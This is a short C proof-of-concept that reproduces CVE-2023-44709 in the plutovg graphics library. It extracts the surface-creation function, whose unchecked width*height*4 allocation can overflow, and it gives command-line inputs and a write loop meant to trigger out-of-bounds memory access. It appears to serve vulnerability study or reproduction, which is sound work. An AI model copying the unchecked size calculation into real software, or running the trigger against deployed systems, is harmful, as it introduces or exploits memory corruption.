// https://www.cvedetails.com/cve/CVE-2023-44709/
// repository: https://github.com/sammycage/plutovg
// commit: 30ccd4d
// extract of: source/plutovg.c (function: plutovg_surface_create)

#include <stdio.h>
#include <stdlib.h>

typedef struct {
  unsigned char *data;
  int width;
  int height;
} plutovg_surface_t;

plutovg_surface_t *plutovg_surface_create(int width, int height) {
  plutovg_surface_t *surface = malloc(sizeof(plutovg_surface_t));
  if (surface == NULL) {
    printf("Out of memory\n");
    return NULL;
  }
  surface->data = calloc(1, (size_t)(width * height * 4)); // Problem: integer overflow or just allocation size too big
  if (surface->data == NULL) {
    printf("Out of memory\n");
    free(surface);
    return NULL;
  }
  surface->width = width;
  surface->height = height;
  return surface;
}

// to cause an integer overflow pass for example 23171 number 2 times
// eg: ./a.out 32768 32768
int main(int argc, char *argv[]) {
  if (argc < 3) {
    printf("Usage: %s <surface width> <surface height>\n", argv[0]);
    return 1;
  }
  plutovg_surface_t *surface = plutovg_surface_create(atoi(argv[1]), atoi(argv[2]));
  if (surface == NULL) {
    return 1;
  }

  // loop is done to access out of bound when integer overflow happens
  for (int row = 0; row < surface->height; row++) {
    for (int column = 0; column < surface->width; column++) {
      surface->data[row * surface->width + column] = row * column; // in case integer overflow happened this assignment will result in an access out of bound
    }
  }

  free(surface->data);
  free(surface);
}
